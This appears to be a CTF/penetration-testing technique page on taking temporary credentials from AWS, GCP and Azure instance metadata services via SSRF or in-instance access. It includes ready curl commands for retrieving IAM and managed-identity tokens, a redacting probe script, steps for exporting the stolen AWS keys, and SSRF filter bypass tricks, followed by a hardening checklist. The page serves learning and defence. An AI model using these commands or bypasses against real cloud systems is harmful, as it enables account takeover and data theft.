---
title: "Cloud Metadata Services - IMDSv1/v2, GCP, Azure and Credential Use"
category: cloud
subcategory: metadata
type: technique
tags: [cloud, metadata, imds, imdsv1, imdsv2, ssrf, aws, gcp, azure, 169-254-169-254, instance-metadata, sts, credentials, service-account, managed-identity, token, link-local]
difficulty: easy
summary: "The link-local metadata endpoint hands running credentials to whatever can reach it; SSRF or in-instance code turns that into cloud API access."
when_to_use:
  - "You have SSRF that can reach 169.254.169.254 or the GCP/Azure metadata host"
  - "You have code execution on a cloud VM/container and need credentials"
  - "The challenge mentions IAM roles, instance profiles, or managed identities"
  - "You need to turn a metadata token into API access"
tools: [curl, awscli, gcloud, az, jq]
related: [aws-enumeration-privesc, kubernetes-attacks, object-storage-misconfig, cloud-enum-script]
---

## TL;DR

Every major cloud runs a metadata service on a link-local address (`169.254.169.254`, or a magic
hostname) that returns the instance's identity and, crucially, temporary credentials for whatever
role/identity is attached. Reaching it - via SSRF or from inside the instance - yields those
credentials; the impact is exactly the IAM permissions of that role.

## Recognise it

- An SSRF where you control a URL and can point it at `169.254.169.254` or
  `metadata.google.internal`.
- A shell on an EC2/GCE/Azure VM or a container that shares the host network.
- A URL-fetching feature (image proxy, webhook, PDF renderer, "import from URL").
- The word "role", "instance profile", "managed identity", or "workload identity" in the brief.

## Theory

### The three metadata services

| Cloud | Endpoint | Auth to read | Credential path |
|---|---|---|---|
| AWS | `http://169.254.169.254/latest/meta-data/` | IMDSv1: none; IMDSv2: a token from a PUT | `iam/security-credentials/<role>` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | header `Metadata-Flavor: Google` | `instance/service-accounts/default/token` |
| Azure | `http://169.254.169.254/metadata/instance` | header `Metadata: true` + `api-version` | `/metadata/identity/oauth2/token` |

### AWS IMDSv1 vs IMDSv2

- **IMDSv1** is a plain unauthenticated GET. Any SSRF that issues a GET to the endpoint reads it.
  This is why it is the classic SSRF-to-cloud-takeover primitive.
- **IMDSv2** requires a session token obtained with a `PUT` to `/latest/api/token`, sent back in the
  `X-aws-ec2-metadata-token` header. It also enforces a default hop limit of 1 (the response TTL),
  so a request forwarded through a proxy/container network layer is dropped. Most reflected-GET SSRF
  cannot perform the `PUT` and header round-trip, which is the whole point of v2.
- The credentials returned are **temporary STS credentials** (AccessKeyId, SecretAccessKey, Token,
  Expiration) scoped to the instance's IAM role.

GCP and Azure both require a non-standard request header, which blocks the simplest reflected SSRF
(a bare GET) but not an SSRF that lets you set headers, nor in-instance code.

### What the credentials are worth

The credentials are not root of the account; they are exactly the attached role/identity's IAM
policy. The next step is enumerating that policy - see `aws-enumeration-privesc`. In a CTF the
objective is usually a specific S3 object, a Secrets Manager entry, or a Lambda's environment.

## Procedure

### AWS

```bash
BASE=http://169.254.169.254

# --- IMDSv1 (works only where v1 is still enabled) ---
curl -s $BASE/latest/meta-data/
curl -s $BASE/latest/meta-data/iam/security-credentials/       # -> the role name
ROLE=$(curl -s $BASE/latest/meta-data/iam/security-credentials/)
curl -s $BASE/latest/meta-data/iam/security-credentials/$ROLE  # -> AccessKeyId/SecretAccessKey/Token

# identity document (account id, region, instance id)
curl -s $BASE/latest/dynamic/instance-identity/document

# --- IMDSv2 (the token dance) ---
TOKEN=$(curl -s -X PUT "$BASE/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  $BASE/latest/meta-data/iam/security-credentials/$ROLE
```

### GCP

```bash
H='Metadata-Flavor: Google'
BASE=http://metadata.google.internal/computeMetadata/v1

curl -s -H "$H" "$BASE/instance/service-accounts/default/email"
curl -s -H "$H" "$BASE/instance/service-accounts/default/scopes"
# an OAuth2 access token for the attached service account
curl -s -H "$H" "$BASE/instance/service-accounts/default/token"
# project metadata (sometimes holds ssh keys / startup scripts with secrets)
curl -s -H "$H" "$BASE/project/attributes/?recursive=true"
```

### Azure

```bash
H='Metadata: true'
BASE=http://169.254.169.254/metadata

curl -s -H "$H" "$BASE/instance?api-version=2021-02-01"
# a bearer token for the ARM resource, from the VM's managed identity
curl -s -H "$H" \
  "$BASE/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Code - a metadata reachability probe

```python
#!/usr/bin/env python3
"""Probe for reachable cloud metadata services and report which identity is exposed.

Read-only: it retrieves metadata and credentials that the endpoint hands out, and
prints WHAT is exposed without using the credentials against any cloud API.

Python 3.11+, standard library only.
"""
from __future__ import annotations

import json
import sys
import urllib.error
import urllib.request

TIMEOUT = 3

AWS = "http://169.254.169.254"
GCP = "http://metadata.google.internal/computeMetadata/v1"
AZURE = "http://169.254.169.254/metadata"


def http(url: str, method: str = "GET", headers: dict | None = None) -> tuple[int, str]:
    req = urllib.request.Request(url, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # connection refused / timeout / DNS
        return 0, str(e)


def redact_creds(text: str) -> str:
    """Mask secret material so the probe output can be shared safely."""
    try:
        data = json.loads(text)
    except Exception:
        return text
    for key in ("SecretAccessKey", "Token", "access_token"):
        if key in data:
            val = str(data[key])
            data[key] = f"<redacted {len(val)} chars>"
    return json.dumps(data, indent=2)


def probe_aws() -> None:
    print("=== AWS IMDS ===")
    # IMDSv2 token first
    code, token = http(f"{AWS}/latest/api/token", method="PUT",
                       headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
    v2 = code == 200 and token
    hdr = {"X-aws-ec2-metadata-token": token} if v2 else {}
    print(f"IMDSv2 token endpoint: {'reachable' if v2 else 'not reachable / blocked'}")

    code, roles = http(f"{AWS}/latest/meta-data/iam/security-credentials/", headers=hdr)
    if code != 200 or not roles.strip():
        print("no IAM role attached or IMDS unreachable")
        # IMDSv1 fallback probe
        code1, _ = http(f"{AWS}/latest/meta-data/")
        print(f"IMDSv1 GET /latest/meta-data/: HTTP {code1}")
        return
    print(f"attached role(s): {roles.strip()}")
    role = roles.strip().splitlines()[0]
    code, creds = http(f"{AWS}/latest/meta-data/iam/security-credentials/{role}", headers=hdr)
    if code == 200:
        print("credentials exposed (secret material redacted):")
        print(redact_creds(creds))
    code, doc = http(f"{AWS}/latest/dynamic/instance-identity/document", headers=hdr)
    if code == 200:
        try:
            d = json.loads(doc)
            print(f"account={d.get('accountId')} region={d.get('region')} instance={d.get('instanceId')}")
        except Exception:
            pass


def probe_gcp() -> None:
    print("\n=== GCP metadata ===")
    h = {"Metadata-Flavor": "Google"}
    code, email = http(f"{GCP}/instance/service-accounts/default/email", headers=h)
    if code != 200:
        print(f"not reachable (HTTP {code})")
        return
    print(f"service account: {email.strip()}")
    code, scopes = http(f"{GCP}/instance/service-accounts/default/scopes", headers=h)
    print(f"scopes:\n{scopes.strip()}")
    code, tok = http(f"{GCP}/instance/service-accounts/default/token", headers=h)
    if code == 200:
        print("access token exposed (redacted):")
        print(redact_creds(tok))


def probe_azure() -> None:
    print("\n=== Azure IMDS ===")
    h = {"Metadata": "true"}
    code, inst = http(f"{AZURE}/instance?api-version=2021-02-01", headers=h)
    if code != 200:
        print(f"not reachable (HTTP {code})")
        return
    try:
        d = json.loads(inst)
        c = d.get("compute", {})
        print(f"vm={c.get('name')} rg={c.get('resourceGroupName')} sub={c.get('subscriptionId')}")
    except Exception:
        print(inst[:200])
    code, tok = http(
        f"{AZURE}/identity/oauth2/token?api-version=2018-02-01"
        "&resource=https://management.azure.com/",
        headers=h,
    )
    if code == 200:
        print("managed-identity token exposed (redacted):")
        print(redact_creds(tok))
    else:
        print(f"managed identity token endpoint: HTTP {code} (may be no identity assigned)")


def main() -> int:
    probe_aws()
    probe_gcp()
    probe_azure()
    return 0


if __name__ == "__main__":
    if "--self-test" in sys.argv:
        # exercise the redactor without any network
        sample = json.dumps({"AccessKeyId": "AKIA", "SecretAccessKey": "s" * 40, "Token": "t" * 100})
        out = redact_creds(sample)
        assert "redacted" in out and "s" * 40 not in out
        assert '"AccessKeyId": "AKIA"' in out  # non-secret field preserved
        gcp = json.dumps({"access_token": "y" * 60, "expires_in": 3599})
        assert "redacted" in redact_creds(gcp)
        print("[+] self-test ok")
        sys.exit(0)
    sys.exit(main())
```

## Using the credentials (AWS example)

```bash
# export the temporary credentials the metadata service returned
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...          # required for STS/temporary creds
# confirm who you are before doing anything
aws sts get-caller-identity
```

See `aws-enumeration-privesc` for the enumeration that follows.

## Variants & pitfalls

- **IMDSv2 hop limit**: the default response TTL of 1 means a request that traverses a container's
  NAT or a reverse proxy is silently dropped. This blocks most reflected SSRF against v2-only
  instances.
- **SSRF header control**: GCP and Azure need a request header. A bare-GET SSRF cannot set it;
  a full-request SSRF (or a redirect that preserves headers) can.
- **SSRF filters**: defenders block `169.254.169.254` by string. Bypasses seen in the wild include
  the decimal/octal/hex forms of the IP, `[::ffff:169.254.169.254]`, a DNS name that resolves to it,
  and an open redirect on an allowlisted host. The endpoint address itself is the constant.
- **GCP `Metadata-Flavor` enforcement**: GCP rejects requests without the header specifically to
  defeat naive SSRF; there is also a `X-Google-Metadata-Request: True` legacy header.
- **Token expiry**: metadata credentials are short-lived (minutes to hours). Grab
  `sts get-caller-identity` immediately and note the expiry.
- **Scopes vs IAM (GCP)**: a GCP token is limited by both the service-account IAM roles and the
  instance's OAuth scopes; a broad IAM role with `read-only` scopes is still read-only.
- **Kubernetes**: on managed clusters the node's metadata endpoint may expose the *node's* cloud
  identity; some clusters block pod access to metadata (`GKE Workload Identity`, IMDS hop limit).

## Hardening checklist

- Enforce IMDSv2 (`HttpTokens: required`) and set the hop limit to 1.
- Block pod/container egress to `169.254.169.254` unless explicitly needed; on GKE use Workload
  Identity and metadata concealment.
- Attach least-privilege roles; a compromised instance is only as powerful as its role.
- Prevent SSRF at the application layer (allowlist outbound hosts, deny link-local ranges).

## Tools

- `curl` - the whole technique is HTTP requests.
- `aws` / `gcloud` / `az` CLIs - to use the credentials once obtained.
- SSRF tooling (Burp, `ssrfmap`) - for the reachability half.

## References

- AWS documentation: "Instance metadata and user data" and "Use IMDSv2".
- Google Cloud documentation: "Storing and retrieving instance metadata".
- Microsoft documentation: "Azure Instance Metadata Service".
